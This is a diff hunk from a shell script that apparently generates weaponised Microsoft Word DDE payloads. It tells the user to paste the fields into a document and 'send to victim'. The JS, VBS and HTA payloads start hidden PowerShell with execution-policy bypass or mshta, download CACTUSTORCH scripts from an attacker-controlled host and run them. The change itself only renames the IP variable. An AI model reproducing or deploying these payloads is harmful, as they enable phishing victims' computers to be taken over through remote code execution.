@@ -132,11 +132,11 @@ esac
 
 
 echo -e "\n\n\n\n\e[91mOpen Microsoft Word and press CTRL+F9 and copy any of the payloads below in between the { } then save and send to victim.\n\n\e[93mJS PAYLOAD:\e[0m\n\
-DDEAUTO c:\\\\\Windows\\\\\System32\\\\\\\cmd.exe \"/k powershell.exe -w hidden -nop -ep bypass -Command" \(new-object System.Net.WebClient\).DownloadFile\(\'http:\/\/$IP\/CACTUSTORCH.js\',\'index.js\'\)\; \& start c:\\\\\\Windows\\\\\\\System32\\\\\\\\cmd.exe \/c cscript.exe index.js\" >payloads.txt
+DDEAUTO c:\\\\\Windows\\\\\System32\\\\\\\cmd.exe \"/k powershell.exe -w hidden -nop -ep bypass -Command" \(new-object System.Net.WebClient\).DownloadFile\(\'http:\/\/$ip\/CACTUSTORCH.js\',\'index.js\'\)\; \& start c:\\\\\\Windows\\\\\\\System32\\\\\\\\cmd.exe \/c cscript.exe index.js\" >payloads.txt
 echo -e "\n\e[93mVBS PAYLOAD:\e[0m\n\
-DDEAUTO c:\\\\\Windows\\\\\System32\\\\\\\cmd.exe \"/k powershell.exe -w hidden -nop -ep bypass -Command" \(new-object System.Net.WebClient\).DownloadFile\(\'http:\/\/$IP\/CACTUSTORCH.vbs\',\'index.vbs\'\)\; \& start c:\\\\\\Windows\\\\\\\System32\\\\\\\\cmd.exe \/c cscript.exe index.vbs\" >>payloads.txt
+DDEAUTO c:\\\\\Windows\\\\\System32\\\\\\\cmd.exe \"/k powershell.exe -w hidden -nop -ep bypass -Command" \(new-object System.Net.WebClient\).DownloadFile\(\'http:\/\/$ip\/CACTUSTORCH.vbs\',\'index.vbs\'\)\; \& start c:\\\\\\Windows\\\\\\\System32\\\\\\\\cmd.exe \/c cscript.exe index.vbs\" >>payloads.txt
 echo -e "\n\e[93mHTA PAYLOAD:\e[0m\n\
-DDEAUTO C:\\\\\Programs\\\\\Microsoft\\\\\Office\\\\\MSword.exe\\\\\..\\\\\..\\\\\..\\\\\..\\\\\windows\\\\\system32\\\\\mshta.exe \"http://$IP/CACTUSTORCH.hta\"" >>payloads.txt
+DDEAUTO C:\\\\\Programs\\\\\Microsoft\\\\\Office\\\\\MSword.exe\\\\\..\\\\\..\\\\\..\\\\\..\\\\\windows\\\\\system32\\\\\mshta.exe \"http://$ip/CACTUSTORCH.hta\"" >>payloads.txt
 clear 
 cat payloads.txt && rm payloads.txt
 echo ""
